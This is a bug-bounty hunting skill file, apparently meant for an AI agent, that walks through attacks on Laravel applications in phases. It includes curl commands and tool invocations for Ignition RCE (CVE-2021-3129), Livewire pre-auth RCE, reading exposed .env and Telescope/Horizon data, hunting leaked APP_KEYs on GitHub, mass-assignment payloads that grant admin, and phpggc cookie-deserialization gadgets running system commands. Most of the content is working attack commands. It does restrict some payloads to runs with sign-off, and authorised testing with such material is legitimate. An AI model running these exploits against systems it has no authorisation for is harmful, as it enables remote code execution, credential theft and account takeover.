---
name: hunt-laravel
description: Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Livewire v3 pre-auth RCE (CVE-2025-54068), APP_KEY leak to decrypt() unserialize RCE, Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
metadata:
  sources: hackerone_public, cve_database
  report_count: 14
---

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **Livewire v3 (CVE-2025-54068)**: pre-auth RCE via `POST /livewire/update` on 3.0.0-beta.1 to 3.6.3; mass-exploited in 2026
- **APP_KEY leak (.env, GitHub, reused public key)**: `decrypt()` unserializes → phpggc gadget → RCE (plus forged sessions → ATO)

---

## Phase 1 — Fingerprint Laravel

```bash
# Laravel-specific indicators
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"

# Livewire v3: script route, update endpoint, component snapshots (feeds Phase 2b)
curl -s -o /dev/null -w "livewire.js: %{http_code}\n" "https://$TARGET/livewire/livewire.js"
curl -s "https://$TARGET/login" | grep -oE 'livewire[.a-z]*\.js\?id=[^"]+|data-update-uri="[^"]+"|wire:snapshot' | sort -u
```

---

## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
# Step 1: Check if debug mode is enabled (Whoops error page)
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

# Step 2: Check Ignition endpoint
curl -s "https://$TARGET/_ignition/health-check" | head -5

# Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
# (Requires debug mode + writable storage/logs)
# Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

# Manual test — send solution request
curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

## Phase 2b - Livewire v3 Pre-Auth RCE (CVE-2025-54068)

Livewire `>= 3.0.0-beta.1, < 3.6.4` (fixed 3.6.4; v1/v2 not affected; CVSS v4 9.2). `POST /livewire/update` hydrates a synthesizer tuple hidden in a nested array inside `updates`, which sits outside the checksummed snapshot, so an unauthenticated request reaches PHP object instantiation. Needs a mounted component with a public property that is not strictly typed. Filament's `/admin/login` was a pre-auth example. In the wild: Imperva observed mass exploitation from 2026-05-24, 6,167 apps compromised and their `.env` credentials harvested.

```bash
# 1. Component pages: any page whose HTML carries wire:snapshot
for p in / /login /register /admin/login; do
  curl -s "https://$TARGET$p" | grep -q 'wire:snapshot' && echo "[+] Livewire component: $p"
done
# 2. Version gate: livewire.js?id=<hash> changes per release; Livepyre maps it to a version.
#    Check mode only, no payload: https://github.com/synacktiv/Livepyre
python3 Livepyre.py -u "https://$TARGET/login" -c
```

- Vulnerable version + mounted component = report on the version gate plus the `-c` output. Without `-c`, Livepyre sends `system('id')` by default: do not run it without Stage B sign-off.
- `-a APP_KEY` mode signs a malicious snapshot and still works on 3.6.4+ (design issue, no CVE, unpatched upstream). A leaked APP_KEY on any Livewire v3 app is RCE regardless of version (Phase 4).
- Sources: https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3 , https://www.synacktiv.com/en/publications/livewire-remote-command-execution-through-unmarshaling , https://www.imperva.com/blog/cve-2025-54068-laravel-livewire-credential-theft-campaign-6000-applications-compromised/

---

## Phase 3 — Laravel Telescope & Horizon

```bash
# Telescope — request/response logs, DB queries, jobs, cache, events
curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

# Horizon — queue worker dashboard
curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
# Failed job payloads often contain full request data including auth tokens

# Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

## Phase 4 — .env File & APP_KEY Exposure

```bash
# Direct .env access
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl -s "https://$TARGET/.env.production"
curl -s "https://$TARGET/.env.backup"
curl -s "https://$TARGET/.env.local"

# If APP_KEY found: grade as RCE, not just ATO. decrypt() calls unserialize() on the plaintext,
# so a re-encrypted XSRF-TOKEN / cookie session reaches a phpggc gadget (Phase 7).
#   CVE-2018-15133: Laravel <= 5.5.40 and 5.6.0-5.6.29, X-XSRF-TOKEN
#   CVE-2024-55556: same class in Crater Invoice, laravel_session with SESSION_DRIVER=cookie
#   Livewire v3: the key signs snapshots (Phase 2b), patched or not
APP_KEY="base64:XXXXXXX"
# Confirm the key without a payload: decrypts the target's own XSRF-TOKEN / session cookies
python3 laravel_crypto_killer.py check "https://$TARGET" "${APP_KEY#base64:}"   # github.com/synacktiv/laravel-crypto-killer

# APP_KEY recovery from public leaks. GitGuardian + Synacktiv (Jul 2025): 260K keys exposed on
# GitHub mapped to 600 vulnerable apps; keys deleted from repos often stay valid in prod.
gh search code "APP_URL=https://$TARGET" --limit 100
gh search code "$TARGET" --filename .env --limit 100
# Also the org's repos + git history (deleted .env), Docker image layers, public CI logs.
# Boilerplate key reuse: crypto-killer `bruteforce` mode tries bundled public-key wordlists
# against a captured XSRF-TOKEN. Validate every candidate with `check` above.
# https://blog.gitguardian.com/exploiting-public-app_key-leaks/

# Also check
curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

## Phase 4b — Environment override via query args (CVE-2024-52301)
When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -> flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
```bash
curl -s "https://$TARGET/?--env=local"          # force debug/local config
curl -s "https://$TARGET/login?--env=testing"    # swap to testing DB/config
# Confirm: debug/Whoops page or a different env banner. Fixed 11.31.0 / 10.48.23 / 9.52.17.
```

## Phase 5 — Signed URL Manipulation

```bash
# Laravel signed URLs contain signature param: ?signature=HASH
# Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl -s "${SIGNED_URL}&extra=malicious"
```

---

## Phase 6 — Mass Assignment via Eloquent

```bash
# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
# Test: add extra fields to update/create requests

# Profile update
curl -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@new.com", "password": "test123", "verified": true, "admin": 1}'
```

---

## Phase 7 — Laravel Cookie Deserialization

```bash
# If APP_KEY is known, forge a session cookie with malicious serialized payload
# Uses phpggc gadget chains

# Get the app key
APP_KEY=$(curl -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

# Generate payload with phpggc
php phpggc Laravel/RCE5 system 'id' | base64

# Sign the cookie with the app key using laravel-cookie-forge script
# python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

## Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
| Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| Livewire v3 < 3.6.4 + mounted component | CVE-2025-54068 `/livewire/update` | Critical pre-auth RCE |
| APP_KEY leaked (.env, GitHub, reused key) | `decrypt()` unserialize → phpggc gadget; Livewire snapshot signing; forged sessions | Critical RCE (ATO as fallback) |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

## Validation

✅ Ignition RCE: `id` command output returned in response
✅ Telescope: API responses contain DB queries with credentials or user tokens
✅ APP_KEY: `laravel_crypto_killer.py check` decrypts the target's cookies (key confirmed); gadget execution only under Stage B sign-off
✅ Livewire: version < 3.6.4 from `livewire.js?id=` hash + `wire:snapshot` component + Livepyre `-c` positive
✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges

**Severity:**
- Ignition RCE: Critical
- Telescope/Horizon with sensitive data: High
- APP_KEY leak (any source): Critical (RCE)
- Livewire CVE-2025-54068: Critical
- Mass assignment to admin: Critical
